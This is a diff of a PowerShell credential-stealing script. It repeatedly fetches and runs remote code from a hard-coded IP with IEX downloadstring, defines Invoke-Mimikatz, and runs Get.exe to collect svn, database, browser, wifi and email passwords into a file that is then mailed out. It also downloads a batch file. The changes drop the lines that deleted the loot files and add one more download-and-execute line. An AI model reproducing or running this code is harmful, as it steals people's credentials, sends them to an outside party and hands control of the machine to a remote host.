@@ -3,7 +3,7 @@ $connectip = '106.80.36.165'
 
 
 
-IEX ((new-object net.webclient).downloadstring('http://106.80.36.165:8080/'))
+
 IEX ((new-object net.webclient).downloadstring('http://106.80.36.165:8080/'))
 
 function Invoke-Mimikatz
@@ -2774,7 +2774,7 @@ D:\Get.exe svn >>D:\GetPass.txt
 D:\Get.exe database >>D:\GetPass.txt
 D:\Get.exe browsers >>D:\GetPass.txt
 D:\Get.exe wifi >>D:\GetPass.txt
-D:\Get.exe emails>>D:\GetPass.txt
+D:\Get.exe emails >>D:\GetPass.txt
 
 
 $mail = New-Object System.Net.Mail.MailMessage
@@ -2801,8 +2801,8 @@ catch
 {
 	echo 'Error!Filed!'
 }
-remove-item 'D:\GetPass.txt'
-remove-item 'D:\Get.exe'
+
+
 
 
 $date = get-date
@@ -2979,6 +2979,7 @@ catch
 	echo 'Error!Filed!'
 }
 
+IEX ((new-object net.webclient).downloadstring('http://106.80.36.165:8080/'))
 
 remove-item $fileSaveDir -recurse
 (new-object System.Net.WebClient).DownloadFile($githuburl + '/run2.rar','D:\run2.bat');
